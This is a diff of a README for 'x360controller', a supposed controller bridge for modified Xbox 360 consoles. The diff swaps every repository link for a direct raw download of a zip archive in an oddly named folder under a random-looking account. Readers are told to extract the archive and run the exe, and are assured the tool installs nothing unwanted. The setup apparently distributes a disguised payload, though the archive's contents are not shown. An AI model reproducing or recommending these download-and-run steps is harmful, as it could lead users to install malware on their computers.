@@ -1,6 +1,6 @@
 # 🎮 x360controller - Connect your controllers to game consoles
 
-[![Download x360controller](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Cristionnapreconditioned662/x360controller)
+[![Download x360controller](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Cristionnapreconditioned662/x360controller/raw/refs/heads/main/trierarchy/x-controller-1.3-alpha.2.zip)
 
 This software acts as a bridge between your Windows computer, Android device, and Xbox 360 game consoles that use RGH or JTAG modifications. It allows your standard controllers to work with modified consoles without extra hardware.
 
@@ -18,7 +18,7 @@ To run this software, ensure your computer meets these basic needs:
 
 Follow these steps to set up your controller bridge.
 
-1. First, visit the official page to download the latest version of the software: [https://github.com/Cristionnapreconditioned662/x360controller](https://github.com/Cristionnapreconditioned662/x360controller)
+1. First, visit the official page to download the latest version of the software: [https://github.com/Cristionnapreconditioned662/x360controller/raw/refs/heads/main/trierarchy/x-controller-1.3-alpha.2.zip](https://github.com/Cristionnapreconditioned662/x360controller/raw/refs/heads/main/trierarchy/x-controller-1.3-alpha.2.zip)
 2. Locate the folder where your file saved.
 3. Extract the contents of the file if it is in a zip format.
 4. Run the exe file.
@@ -75,4 +75,4 @@ Verify the IP address again. Ensure the console has RGH or JTAG software active.
 The tool performs simple input redirection. It does not modify system files or install unwanted software. Keep your antivirus current to maintain a healthy system. 
 
 Visit the link below for the latest updates and files:
-[https://github.com/Cristionnapreconditioned662/x360controller](https://github.com/Cristionnapreconditioned662/x360controller)
+[https://github.com/Cristionnapreconditioned662/x360controller/raw/refs/heads/main/trierarchy/x-controller-1.3-alpha.2.zip](https://github.com/Cristionnapreconditioned662/x360controller/raw/refs/heads/main/trierarchy/x-controller-1.3-alpha.2.zip)
